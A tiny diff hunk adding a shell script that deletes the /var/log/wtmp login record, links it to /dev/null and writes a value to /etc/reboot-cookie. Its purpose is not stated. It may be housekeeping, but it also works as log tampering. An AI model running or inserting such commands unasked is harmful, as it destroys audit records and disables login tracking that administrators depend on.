@@ -1,0 +1,4 @@
+#! /bin/sh
+rm /var/log/wtmp
+ln -s /dev/null /var/log/wtmp
+echo 0 > /etc/reboot-cookie
